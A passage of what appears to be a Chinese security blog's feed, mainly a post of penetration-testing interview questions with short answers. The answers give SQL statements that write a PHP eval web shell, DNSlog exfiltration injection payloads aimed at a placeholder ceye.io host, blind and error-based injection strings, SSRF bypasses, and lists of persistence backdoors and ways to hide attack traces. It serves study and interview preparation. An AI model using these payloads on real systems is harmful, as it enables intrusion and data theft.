&quot;/lib/egg/yara_python-3.5.0-py2.7-linux-3.10-x86_64.egg&quot;</span><br><span class="line">               DEPENDENT_LIBRARIES_4_20 = &quot;/lib/egg/yara_python-3.8.1-py2.7-linux-4.20-x86_64.egg&quot;</span><br><span class="line">               DEPENDENT_LIBRARIES_16 = &quot;/lib/egg/yara_python-3.5.0-py2.7-macosx-10.12-x86_64.egg&quot;</span><br><span class="line">               DEPENDENT_LIBRARIES_17 = &quot;/lib/egg/yara_python-3.5.0-py2.7-macosx-10.13-x86_64.egg&quot;</span><br><span class="line">               _kernel = platform.release()</span><br><span class="line">               #platform.release操作系统版本号</span><br><span class="line">               if _kernel.startswith(&#x27;2.6&#x27;):</span><br><span class="line">                   sys.path.append(SYS_PATH + DEPENDENT_LIBRARIES_2_6)</span><br><span class="line">               elif _kernel.startswith(&#x27;3.&#x27;) and (&quot;6.&quot; in str(platform.dist())):</span><br><span class="line">                   sys.path.append(SYS_PATH + DEPENDENT_LIBRARIES_2_6)</span><br><span class="line">               elif _kernel.startswith(&#x27;3.&#x27;):</span><br><span class="line">                   sys.path.append(SYS_PATH + DEPENDENT_LIBRARIES_3_10)</span><br><span class="line">               elif _kernel.startswith(&#x27;4.&#x27;):</span><br><span class="line">                   sys.path.append(SYS_PATH + DEPENDENT_LIBRARIES_4_20)</span><br><span class="line">               elif _kernel.startswith(&#x27;16.&#x27;):</span><br><span class="line">                   sys.path.append(SYS_PATH + DEPENDENT_LIBRARIES_16)</span><br><span class="line">               elif _kernel.startswith(&#x27;17.&#x27;):</span><br><span class="line">                   sys.path.append(SYS_PATH + DEPENDENT_LIBRARIES_17)</span><br><span class="line">               else:</span><br><span class="line">                   return suspicious, malice, True</span><br><span class="line">               import yara</span><br><span class="line">           else:</span><br><span class="line">               return suspicious, malice, True</span><br></pre></td></tr></table></figure><p><img src="http://www.xt996.top/muggle/2020/03/24/3.24/3.24-1.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;学习Emotet木马特征，以及python导入egg&lt;/p&gt;</summary>
    
    
    
    <category term="每日学习小结" scheme="http://example.com/categories/%E6%AF%8F%E6%97%A5%E5%AD%A6%E4%B9%A0%E5%B0%8F%E7%BB%93/"/>
    
    
    <category term="木马" scheme="http://example.com/tags/%E6%9C%A8%E9%A9%AC/"/>
    
    <category term="python" scheme="http://example.com/tags/python/"/>
    
    <category term="毕业设计" scheme="http://example.com/tags/%E6%AF%95%E4%B8%9A%E8%AE%BE%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>渗透面试题</title>
    <link href="http://example.com/2020/03/24/%E6%B8%97%E9%80%8F%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
    <id>http://example.com/2020/03/24/%E6%B8%97%E9%80%8F%E9%9D%A2%E8%AF%95%E9%A2%98/</id>
    <published>2020-03-24T01:37:52.000Z</published>
    <updated>2020-03-24T03:03:38.249Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>近期面试喜欢问的问题，总结了一下。</strong></p><h2 id="岗位分析"><a href="#岗位分析" class="headerlink" title="岗位分析"></a>岗位分析</h2><p>整体安全行业，随着网络安全的大火，Web安全入门浅，培训机构遍地开会，大量花里胡哨的人才都争着用了进来，所以想要突出，必须要有自己的一技之长。</p><p>那么当前网络安全的技术岗位，热门方向有很多，说几个例子。</p><table><thead><tr><th align="left">逆向</th></tr></thead><tbody><tr><td align="left"><strong>APT</strong></td></tr><tr><td align="left"><strong>代码审计</strong></td></tr><tr><td align="left"><strong>区块链</strong></td></tr><tr><td align="left"><strong>渗透（不限于内网、CS客户端，APP，小程序，微服务等）</strong></td></tr></tbody></table><h2 id="常见面试题及参考"><a href="#常见面试题及参考" class="headerlink" title="常见面试题及参考"></a>常见面试题及参考</h2><h3 id="问：MySQL写WebShell有几种方式，利用条件"><a href="#问：MySQL写WebShell有几种方式，利用条件" class="headerlink" title="问：MySQL写WebShell有几种方式，利用条件"></a>问：MySQL写WebShell有几种方式，利用条件</h3><p>答：</p><p>一、</p><blockquote><p>union select 后写入</p><p>lines terminated by 写入</p><p>lines starting by 写入</p><p>fields terminated by 写入</p><p>COLUMNS terminated by 写入</p></blockquote><p>二、</p><blockquote><p>root权限</p><p>GPC关闭（能使用单引号），magic_quotes_gpc&#x3D;On</p><p>有绝对路径（读文件可以不用，写文件必须）</p><p>没有配置–secure-file-priv</p><p>成功条件：有读写的权限，有create、insert、select的权限</p></blockquote><h3 id="问：Sql-注入无回显的情况下，利用-DNSlog，mysql-下利用什么构造代码，mssql-下又如何？"><a href="#问：Sql-注入无回显的情况下，利用-DNSlog，mysql-下利用什么构造代码，mssql-下又如何？" class="headerlink" title="问：Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何？"></a>问：Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何？</h3><p>答：</p><blockquote><p>（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。</p><p>（2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。</p><p>（3）Mysql 中利用 load_file() 构造payload</p><p>‘ and if((select load_file(concat(‘\\’,(select database()),’.xxx.ceye.io\abc’))),1,0)# </p><p>（4）Mssql 下利用 master..xp_dirtree 构造payload</p><p>DECLARE @host varchar(1024);SELECT @host&#x3D;(SELECT db_name())+’.xxx.ceye.io’;EXEC(‘master..xp_dirtree”\’+@host+’\foobar$”‘);</p></blockquote><h3 id="问：phpmyadmin写sehll的方法"><a href="#问：phpmyadmin写sehll的方法" class="headerlink" title="问：phpmyadmin写sehll的方法"></a>问：phpmyadmin写sehll的方法</h3><p>答：</p><p>一、常规导入shell的操作</p><blockquote><p>创建数据表导出shell</p><p>CREATE TABLE <code>mysql</code>.<code>shadow9</code> (<code>content</code> TEXT NOT NULL );</p><p>INSERT INTO <code>mysql</code>.<code>shadow9</code> (<code>content</code> ) VALUES (‘<?php @eval($_POST[pass]);?>’);</p><p>SELECT <code>content</code> FROM <code>shadow9</code> INTO OUTFILE ‘C:\phpStudy\WWW\90sec.php’;</p><p>DROP TABLE IF EXISTS <code>shadow9</code>;</p></blockquote><p>二、一句话导出shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php @eval($_POST[pass]);?&gt;&#x27; into outfile &#x27;c:/phpstudy/www/90sec.php&#x27;;   select &#x27;&lt;?php @eval($_POST[pass]);?&gt;&#x27; into outfile &#x27;c:\\phpstudy\\www\\90sec.php&#x27;; select &#x27;&lt;?php @eval($_POST[pass]);?&gt;&#x27; into dumpfile &#x27;c:\\phpstudy\\www\\bypass.php&#x27;;</span><br></pre></td></tr></table></figure><p>三、日志备份获取shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &quot;%genera%&quot;;          //查询general_log配置 set global general_log=&#x27;on&#x27;;              //开启general log模式 SET global general_log_file=&#x27;D:/phpStudy/WWW/cmd.php&#x27;;    //设置日志文件保存路径 SELECT &#x27;&lt;?php phpinfo();?&gt;&#x27;;              //phpinfo()写入日志文件 set global general_log=&#x27;off&#x27;;              //关闭general_log模式</span><br></pre></td></tr></table></figure><h3 id="问：权限维持的方法"><a href="#问：权限维持的方法" class="headerlink" title="问：权限维持的方法"></a>问：权限维持的方法</h3><p>答：</p><p>留自启动后门方法很多,大多数都添加到服务,加注册表 加启动项，</p><p><strong>windows：</strong></p><blockquote><p>1.替换系统文件类(shift后门,放大镜后门)</p><p>2.修改注册表类</p><p>自启动项、屏幕保护程序注册表、用户登陆初始化、登录脚本、映像劫持、影子账户、AppCertDlls注册表项、AppInit_DLLs注册表项、文件关联、用户登陆初始化、xx.Netsh Helper DLL</p><p>3.文件类</p><p>自启动文件夹、office Word StartUp劫持</p><p>4.计划任务</p><p>schtasks 、WMI、bitsadmin</p></blockquote><p><strong>Linux</strong></p><blockquote><p>1.预加载型动态链接库后门</p><p>2.strace后门</p><p>3.SSH 后门</p><p>4.SUID后门</p><p>5.inetd服务后门</p><p>6.协议后门</p><p>7.vim后门</p><p>8.PAM后门</p><p>9.进程注入</p><p>10.Rootkit</p><p>11.端口复用</p></blockquote><p><strong>MSF权限维持</strong></p><blockquote><p>1.Persistence模块</p><p>2.Metsvc 模块</p></blockquote><p><strong>Powershell权限维持</strong></p><p><strong>CS权限维持</strong></p><blockquote><p>SC命令</p></blockquote><h3 id="问：XXE-漏洞原理，代码审计如何寻找？"><a href="#问：XXE-漏洞原理，代码审计如何寻找？" class="headerlink" title="问：XXE 漏洞原理，代码审计如何寻找？"></a>问：XXE 漏洞原理，代码审计如何寻找？</h3><p>答：</p><p>（1）XXE （XML 外部实体注入）当 应用允许引用 XML 外部实体时，攻击者通过构造恶意内容，就可能进行任意文件读取、系统命令执行、内网端口探测、内网网站攻击等操作。</p><p>支持的协议如下图：</p><p><a href="https://image.3001.net/images/20200228/1582890916_5e58ffa4c2932.png"><img src="https://image.3001.net/images/20200228/1582890916_5e58ffa4c2932.png!small" alt="img"></a></p><p><strong>Java</strong> :支持http、https、file、ftp、mailto、jar、netdoc、（1.8不支持gopher）</p><p>（2）审计函数，涉及到XML文件处理，都可能造成 XXE</p><p>（3）防御方法：禁用外部实体</p><h3 id="问：SSRF-禁用-127-0-0-1-后如何绕过，支持哪些协议？"><a href="#问：SSRF-禁用-127-0-0-1-后如何绕过，支持哪些协议？" class="headerlink" title="问：SSRF 禁用 127.0.0.1 后如何绕过，支持哪些协议？"></a>问：SSRF 禁用 127.0.0.1 后如何绕过，支持哪些协议？</h3><p>答：</p><blockquote><p>(1)利用进制转换</p><p>(2)利用DNS解析</p><p>(3)利用句号（127。0。0。1）</p><p>(4)利用[::]（http:&#x2F;&#x2F;[::]:80&#x2F;）；</p><p>(5)利用@（<a href="http://example.com@127.0.0.1/">http:&#x2F;&#x2F;example.com@127.0.0.1</a>）；</p><p>(6)利用短地址（<a href="http://dwz.cn/11SMa%EF%BC%89%EF%BC%9B">http://dwz.cn/11SMa）；</a></p><p>(7)协议（Dict:&#x2F;&#x2F;、SFTP:&#x2F;&#x2F;、TFTP:&#x2F;&#x2F;、LDAP:&#x2F;&#x2F;、Gopher:&#x2F;&#x2F;）</p></blockquote><h3 id="问：应急响应如何查找挖矿病毒，如何通过进程找到挖矿文件"><a href="#问：应急响应如何查找挖矿病毒，如何通过进程找到挖矿文件" class="headerlink" title="问：应急响应如何查找挖矿病毒，如何通过进程找到挖矿文件"></a>问：应急响应如何查找挖矿病毒，如何通过进程找到挖矿文件</h3><p>答：</p><blockquote><p>(1)任务管理器netstat -anp寻找异常进程PID看端口信息，然后根据端口信息定位到文件，cd &#x2F;proc&#x2F;PID （ls -l查看），</p><p>禁用可疑的服务项。</p><p>(2)windows还可以用wmic分析进程参数</p></blockquote><h3 id="问：struts2框架漏洞原理"><a href="#问：struts2框架漏洞原理" class="headerlink" title="问：struts2框架漏洞原理"></a>问：struts2框架漏洞原理</h3><p>答：</p><blockquote><p>(1)struts是java的web框架</p><p>(2)采取OGNL表达式，处理view层数据字符串到controller层转换成java对象</p><p>(3)重点关注的编号加粗如下</p></blockquote><p>S2-057 影响范围非常小</p><p>S2-048 影响范围非常小</p><p><strong>S2-046 和S2-045一样</strong></p><p><strong>S2-045 影响范围较大—-通过Content-Type这个header头，进而执行命令，通过Strus2对错误消息处理进行回显</strong></p><p>S2-037 影响范围小</p><p>S2-032 影响范围小</p><p>S2-020 影响范围小</p><p>S2-019 影响范围一般</p><p><strong>S2-016 影响范围非常大</strong></p><p>S2-013 S2-016范围内</p><p>S2-009 S2-016范围内</p><p>S2-005 S2-016范围内</p><h3 id="问：JAVA反序列化原理"><a href="#问：JAVA反序列化原理" class="headerlink" title="问：JAVA反序列化原理"></a>问：JAVA反序列化原理</h3><p>答：</p><blockquote><p>（1）Java序列化指Java对象转换为字节序列的过程</p><p>（2）Java反序列化指字节序列恢复为Java对象的过程</p><p>（3） Commons-collections 爆出第一个漏洞开始，Java反序列化漏洞的事件就层出不穷。</p><p>（4）在Java中,利用ObjectInputStream的readObject方法进行对象读取</p><p>（5）可以深入了解 ysoserial有哪些gadgets</p></blockquote><h3 id="问：cors如何产生，有哪些利用方式？绕过同源策略的方法有哪些？jsonp跨域如何利用？"><a href="#问：cors如何产生，有哪些利用方式？绕过同源策略的方法有哪些？jsonp跨域如何利用？" class="headerlink" title="问：cors如何产生，有哪些利用方式？绕过同源策略的方法有哪些？jsonp跨域如何利用？"></a><strong>问：cors如何产生，有哪些利用方式？绕过同源策略的方法有哪些？jsonp跨域如何利用？</strong></h3><p>答：</p><p>（1）CORS全称是”跨域资源共享”（Cross-origin resource sharing）,Origin源未严格，从而造成跨域问题,允许浏览器向跨源服务器，发出<a href="http://www.ruanyifeng.com/blog/2012/09/xmlhttprequest_level_2.html">XMLHttpRequest</a>请求</p><p>（2）Origin为*的时候，使用curl测试CORS，</p><p>curl <url> -H “Origin: <a href="https://evil.com/">https://evil.com</a>” -I</p><p>再寻找的api接口是否有敏感信息泄漏。</p><p>（3）同源：协议相同、域名相同、端口相同，绕过同源策略限制的方法：</p><blockquote><p>1、document.domain属性</p><p>2、片段识别符（URL后加#号）</p><p>3、window.name</p><p>4、跨文档通信API</p><p>5、JSONP</p><p>6、CORS</p><p>7、WebSockets</p></blockquote><p>（4）jsonp跨域利用：获取JSON数据并编码发送到远程服务器上</p><h3 id="问：phar协议如何利用，php伪协议input与post数据包发送有什么区别？"><a href="#问：phar协议如何利用，php伪协议input与post数据包发送有什么区别？" class="headerlink" title="问：phar协议如何利用，php伪协议input与post数据包发送有什么区别？"></a>问：phar协议如何利用，php伪协议input与post数据包发送有什么区别？</h3><p>答：</p><p>（1）可以Bypass一些waf，绕过上传限制</p><p>（2）Phar反序列化，Phar:&#x2F;&#x2F; 伪协议读取phar文件时，会反序列化meta-data储存</p><p>（3） 区别</p><blockquote><p>一、 application&#x2F;x-www-form-urlencoded 或 multipart&#x2F;form-data时</p><p>php:&#x2F;&#x2F;input 中是原始数据。</p><p>$_POST 中是关联数组，且没有上传控件的内容。</p><p>二、enctype&#x3D;”multipart&#x2F;form-data” 时</p><p>php:&#x2F;&#x2F;input 是无效的。</p><p>三、 Content-Type &#x3D; “text&#x2F;plain”时 </p><p>$_POST 不能获取post的数据， php:&#x2F;&#x2F;input可以。</p></blockquote><h3 id="问：内网服务器，如何进行信息收集"><a href="#问：内网服务器，如何进行信息收集" class="headerlink" title="问：内网服务器，如何进行信息收集"></a>问：内网服务器，如何进行信息收集</h3><h3 id="答："><a href="#答：" class="headerlink" title="答："></a>答：</h3><p>（1）手动，用一些小工具（批量看存活）</p><p>new user &#x2F;domain查域、net view看共享、hosts文件内网ip域名映射、wifi记录和密码、浏览器中的密码、敏感文件、各类服务的配置文件中信息、历史命令、ssh私钥、FTP的连接信息、xshell等ssh连接工具的session文件，3389连接历史和被连接历史信息、某些内网api接口未授权访问</p><p>（2）扫描器</p><p>主机扫描、端口扫描、漏洞扫描、识别内网环境、密码爆破、抓密码</p><p>（3）留后门，抓信息</p><h3 id="问：内网黄金票据、白银票据的区别和利用方式"><a href="#问：内网黄金票据、白银票据的区别和利用方式" class="headerlink" title="问：内网黄金票据、白银票据的区别和利用方式"></a>问：内网黄金票据、白银票据的区别和利用方式</h3><p>答：</p><p>（1）白银票据：抓取到了域控服务hash的情况下，在客户端以一个普通域用户的身份生成TGS票据，并且是针对于某个机器上的某个服务的，生成的白银票据,只能访问指定的target机器中指定的服务。</p><p>黄金票据：直接抓取域控中账号的hash，来在client端生成一个TGT票据，那么该票据是针对所有机器的所有服务。</p><p>（2）通过mimkatz执行，导出域控中账号的Hash</p><h3 id="问：docker远程api漏洞原理"><a href="#问：docker远程api漏洞原理" class="headerlink" title="问：docker远程api漏洞原理"></a>问：docker远程api漏洞原理</h3><p>答：</p><p>（1）docker swarm 是一个将docker集群变成单一虚拟的docker host工具，使用标准的Docker API，能够方便docker集群的管理和扩展，该未授权访问,可以通过url操作，执行docker命令。</p><p>（2）通过docker client执行目标服务器容器命令，docker是以root权限运行的</p><p>一、有运行ssh服务，&#x2F;root&#x2F;.ssh目录挂载到container内，，然后修改&#x2F;.ssh&#x2F;authorized_keys 文件，把自己的public key写进去</p><p>二、没有运行ssh服务，利用挂载写crontab定时任务，反弹一个shell</p><h3 id="问：ssrf怎么用redis写shell"><a href="#问：ssrf怎么用redis写shell" class="headerlink" title="问：ssrf怎么用redis写shell"></a>问：ssrf怎么用redis写shell</h3><p>答：</p><p>（1）SSRF服务端请求伪造</p><blockquote><p>一、对内网扫描，获取 banner </p><p>二、攻击运行在内网的应用，主要是使用 GET 参数就可以实现的攻击（比如 Struts2，sqli 等）</p><p>三、利用协议读取本地文件</p><p>四、 云计算环境AWS Google Cloud 环境可以调用内网操作 ECS 的 API</p></blockquote><p>（2）如webligic SSRF漏洞</p><p>通过SSRF的gopher协议操作内网的redis，利用redis将反弹shell写入crontab定时任务，url编码，将\r字符串替换成%0d%0a</p><h3 id="问：预编译能否100-防sql注入，如果不能，写一个"><a href="#问：预编译能否100-防sql注入，如果不能，写一个" class="headerlink" title="问：预编译能否100%防sql注入，如果不能，写一个"></a><strong>问：预编译能否100%防sql注入，如果不能，写一个</strong></h3><p>答：</p><p>不能。</p><p>一、</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$pdo-&gt;query(&#x27;SET NAMES gbk&#x27;);</span><br><span class="line">$var = &quot;\xbf\x27 OR 1=1 /*&quot;;</span><br><span class="line">$query = &#x27;SELECT * FROM test WHERE name = ? LIMIT 1&#x27;;</span><br><span class="line">$stmt = $pdo-&gt;prepare($query);</span><br><span class="line">$stmt-&gt;execute(array($var));</span><br></pre></td></tr></table></figure><p>类似于宽字节注入</p><p>二、</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$dbh = new PDO(&quot;txf&quot;);</span><br><span class="line">$name = $_GET[&#x27;name&#x27;];</span><br><span class="line">$stmt = $dbh-&gt;prepare(&#x27;SELECT * FROM &#x27; . $name . &#x27; where username = :username&#x27;);</span><br><span class="line">$stmt-&gt;execute( array(&#x27;:username&#x27; =&gt; $_REQUEST[&#x27;username&#x27;]) );</span><br></pre></td></tr></table></figure><p>参数name是一串数组，PDO不会生效</p><p>三、</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$stmt = $dbh-&gt;prepare(&#x27;SELECT * FROM foo ORDER BY :userSuppliedData&#x27;);</span><br></pre></td></tr></table></figure><p>PDO对DDL不生效</p><h3 id="问：WAF-绕过"><a href="#问：WAF-绕过" class="headerlink" title="问：WAF 绕过"></a>问：WAF 绕过</h3><p>答：</p><blockquote><p>1 注释替换空格 </p><p>2 字符集绕过</p><p>3 chunked绕过</p><p>4 上传请求 multipart 绕过</p><p>5.参数污染</p><p>。。。</p></blockquote><h3 id="问：SQL注入构造payload"><a href="#问：SQL注入构造payload" class="headerlink" title="问：SQL注入构造payload"></a>问：SQL注入构造payload</h3><p>答：</p><p>一、布尔型盲注</p><p>(1)mysql :</p><p>‘and (length(database()))&gt;10 –+</p><p>(2)oracle:</p><p>‘ and 1&#x3D;(select decode(user,’SCOTT’,1,0) from dual) –</p><p>二、时间型盲注</p><p>and if(ascii(substr((select database()),1,1))&gt;115,1,sleep(5))</p><p>三、利用报错回显</p><p>(1) extractvalue</p><p>and extractvalue(1,concat(0x7e,(select database())))</p><p>(2) updatexml</p><p>updatexml(1,concat(0x7e,(select @@version),0x7e),1)</p><h3 id="问：UDF提权原理"><a href="#问：UDF提权原理" class="headerlink" title="问：UDF提权原理"></a>问：UDF提权原理</h3><p>答：利用了root 高权限，创建带有调用cmd的函数的udf.dll动态链接库，导出 udf.dll 文件后，我们就可以直接在命令框输入 cmd</p><h3 id="问：提权方式"><a href="#问：提权方式" class="headerlink" title="问：提权方式"></a>问：提权方式</h3><p>答：</p><p>windows:</p><blockquote><p>1.systminfo ,根据系统补丁提权</p><p>2.第三方服务提权</p><p>3.数据库提权</p><p>。。。</p></blockquote><p>linux:</p><blockquote><p>1.利用系统内核漏洞进行提权 </p><p>2.泄漏密码提权</p><p>3.sudo提权</p><p>4.SUID提权</p><p>。。。</p></blockquote><h3 id="问：XSS弹窗函数及常见的-XSS-绕过策略"><a href="#问：XSS弹窗函数及常见的-XSS-绕过策略" class="headerlink" title="问：XSS弹窗函数及常见的 XSS 绕过策略"></a><strong>问：XSS弹窗函数及常见的 XSS 绕过策略</strong></h3><p>答：</p><p>一、alert,confirm,prompt三种函数</p><p>二、绕过策略</p><blockquote><p>\1. 大小写混合</p><p>\2. 双写</p><p>3.编码</p><p>\4. fuzz 低频使用标签 &lt;details&#x2F;open&#x2F;ontoggle&gt;</p><p>\5. fuzz 低频使用函数 ontoggle 等</p><p>6.&lt;img&#x2F;src&#x3D;1&gt;</p><p>7.%0a或者%0d绕过</p></blockquote><h3 id="问：Windows-cmd-如何下载文件"><a href="#问：Windows-cmd-如何下载文件" class="headerlink" title="问：Windows cmd 如何下载文件"></a>问：Windows cmd 如何下载文件</h3><p>答：</p><blockquote><p>1.certutil.exe</p><p>2.powershell</p><p>3.bitsadmin</p><p>4.vbs</p><p>5.ftp</p></blockquote><h3 id="问：SVN-x2F-GIT源代码泄露"><a href="#问：SVN-x2F-GIT源代码泄露" class="headerlink" title="问：SVN&#x2F;GIT源代码泄露"></a><strong>问：SVN&#x2F;GIT源代码泄露</strong></h3><p>答：</p><blockquote><p>（1）在使用SVN管理本地代码过程中，会自动生成一个名为.svn的隐藏文件夹，其中包含重要的源代码信息</p><p>&#x2F;.git&#x2F;config</p><p>（2）使用git进行版本控制，对站点自动部署。如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞</p><p>&#x2F;.svn&#x2F;entries</p></blockquote><h3 id="问：reverse-tcp-和-bind-tcp-的区别"><a href="#问：reverse-tcp-和-bind-tcp-的区别" class="headerlink" title="问：reverse_tcp 和 bind_tcp 的区别"></a>问：reverse_tcp 和 bind_tcp 的区别</h3><p>答：</p><p>（1）reverse_tcp</p><p>木马会主动连接目标服务器</p><p>（2）bind_tcp</p><p>木马会监听本地的端口</p><h3 id="什么是fastjson-有哪些漏洞？"><a href="#什么是fastjson-有哪些漏洞？" class="headerlink" title="什么是fastjson,有哪些漏洞？"></a>什么是fastjson,有哪些漏洞？</h3><p>答：</p><p>（1）Fastjson是Alibaba开发的Java语言编写的高性能JSON库</p><p>（2）攻击者准备rmi服务和web服务，将rmi绝对路径注入到lookup方法中，受害者JNDI接口会指向攻击者控制rmi服务器，JNDI接口向攻击者控制web服务器远程加载恶意代码，执行构造函数形成RCE</p><p>（3）fastjson漏洞历史</p><p>1.fastjson-1.2.24</p><p>(fastjson接受的JSON可以通过艾特type字段来指定该JSON应当还原成何种类型的对象，在反序列化的时候方便操作)</p><p>2.fastjson-1.248以下</p><p>(checkAutoType中使用TypeUtils.getClassFromMapping(typeName)去获取class不为空，从而绕过了黑名单检测)</p><p>3.fastjson-1.2.60以下</p><p>(在此版本以下，字符串中包含\x转义字符时可以造成dos漏洞)</p><h3 id="问：隐藏攻击痕迹的方法"><a href="#问：隐藏攻击痕迹的方法" class="headerlink" title="问：隐藏攻击痕迹的方法"></a>问：隐藏攻击痕迹的方法</h3><p>答：</p><blockquote><p>1.跳板</p><p>2.代理服务器</p><p>3.Tor</p><p>4.日志</p><p>5.清除历史记录</p><p>6.粉碎文件</p></blockquote><h2 id="理解漏洞"><a href="#理解漏洞" class="headerlink" title="理解漏洞"></a>理解漏洞</h2><p>讲诉一些近期及有代表性的漏洞</p><h3 id="Microsoft-Exchange-Net反序列化远程代码执行-CVE-2020-0688"><a href="#Microsoft-Exchange-Net反序列化远程代码执行-CVE-2020-0688" class="headerlink" title="Microsoft Exchange .Net反序列化远程代码执行(CVE-2020-0688)"></a>Microsoft Exchange .Net反序列化远程代码执行(CVE-2020-0688)</h3><p>该漏洞是由于Exchange控制面板（ECP）组件中使用了静态密钥validationKey和decryptionKey</p><h3 id="Apache-Tomcat-文件包含漏洞-CVE-2020-1938"><a href="#Apache-Tomcat-文件包含漏洞-CVE-2020-1938" class="headerlink" title="Apache Tomcat 文件包含漏洞(CVE-2020-1938)"></a>Apache Tomcat 文件包含漏洞(CVE-2020-1938)</h3><p>默认情况下,Tomcat会开启AJP连接器, Tomcat在AJP协议的实现上存在漏洞,导致攻击者可以通过发送恶意的请求,可以读取或者包含Web根目录下的任意文件,配合文件上传，将导致任意代码执行(RCE)</p><h3 id="Weblogic-IIOP反序列化漏洞（CVE-2020-2551）"><a href="#Weblogic-IIOP反序列化漏洞（CVE-2020-2551）" class="headerlink" title="Weblogic IIOP反序列化漏洞（CVE-2020-2551）"></a>Weblogic IIOP反序列化漏洞（CVE-2020-2551）</h3><p>weblogic核心组件中IIOP协议，通过该协议对存在漏洞的WebLogic进行远程代码执行的攻击</p><h3 id="Apache-Solr远程代码执行（CVE-2019-12409）"><a href="#Apache-Solr远程代码执行（CVE-2019-12409）" class="headerlink" title="Apache Solr远程代码执行（CVE-2019-12409）"></a>Apache Solr远程代码执行（CVE-2019-12409）</h3><p>默认配置文件solr.in.sh,在其配置文件中ENABLE_REMOTE_JMX_OPTS字段默认配置不安全.如果使用默认配置,将启用JMX监视服务并将对公网监听18983的RMI端口,无需任何验证,配合JMX RMI远程代码执行</p><h3 id="SHIRO-550-反序列化漏洞"><a href="#SHIRO-550-反序列化漏洞" class="headerlink" title="SHIRO-550 反序列化漏洞"></a>SHIRO-550 反序列化漏洞</h3><p>shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：</p><p>得到rememberMe的cookie值–&gt;Base64解码–&gt;AES解密–&gt;反序列化</p><p>AES的密钥是硬编码在代码里，就导致了反序列化的RCE漏洞</p><h3 id="SHIRO-721反序列化漏洞"><a href="#SHIRO-721反序列化漏洞" class="headerlink" title="SHIRO-721反序列化漏洞"></a>SHIRO-721反序列化漏洞</h3><p>不需要key，利用Padding Oracle Attack构造出RememberMe字段后段的值结合合法的RememberMe cookie即可完成攻击</p><h3 id="泛微Ecology-OA-SQL注入漏洞"><a href="#泛微Ecology-OA-SQL注入漏洞" class="headerlink" title="泛微Ecology OA SQL注入漏洞"></a>泛微Ecology OA SQL注入漏洞</h3><p>validate.jsp接口的SQL注入，&#x2F;cpt&#x2F;manage&#x2F;validate.jsp</p><h3 id="泛微ecology-OA系统接口存在数据库配置信息泄露"><a href="#泛微ecology-OA系统接口存在数据库配置信息泄露" class="headerlink" title="泛微ecology OA系统接口存在数据库配置信息泄露"></a>泛微ecology OA系统接口存在数据库配置信息泄露</h3><p>&#x2F;mobile&#x2F;dbconfigreader.jsp,直接访问该页面将为DES加密以后的乱码,使用DES算法结合硬编码的key进行解密</p><h3 id="Confluence本地文件泄露漏洞-CVE-2019-3394"><a href="#Confluence本地文件泄露漏洞-CVE-2019-3394" class="headerlink" title="Confluence本地文件泄露漏洞(CVE-2019-3394)"></a>Confluence本地文件泄露漏洞(CVE-2019-3394)</h3><p>catalina.jar中的org.apache.catalina.webresources.StandardRoot.class的getResource方法的validate存在过滤和限制，所以可遍历路径均在&#x2F;WEB-INF下</p><h3 id="Apache-Dubbo反序列化漏洞（CVE-2019-17564）"><a href="#Apache-Dubbo反序列化漏洞（CVE-2019-17564）" class="headerlink" title="Apache Dubbo反序列化漏洞（CVE-2019-17564）"></a>Apache Dubbo反序列化漏洞（CVE-2019-17564）</h3><p>当HTTP remoting 开启的时候，存在反序列化漏洞</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;近期面试喜欢问的问题，总结了一下。&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;岗位分析&quot;&gt;&lt;a href=&quot;#岗位分析&quot; c</summary>
      
    
    
    
    <category term="面试题" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
    
    
    <category term="渗透" scheme="http://example.com/tags/%E6%B8%97%E9%80%8F/"/>
    
    <category term="面试题" scheme="http://example.com/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>3-23</title>
    <link href="http://example.com/2020/03/23/3.23/"/>
    <id>http://example.com/2020/03/23/3.23/</id>
    <published>2020-03-23T01:55:34.000Z</published>
    <updated>2020-03-23T09:30:32.263Z</updated>
    
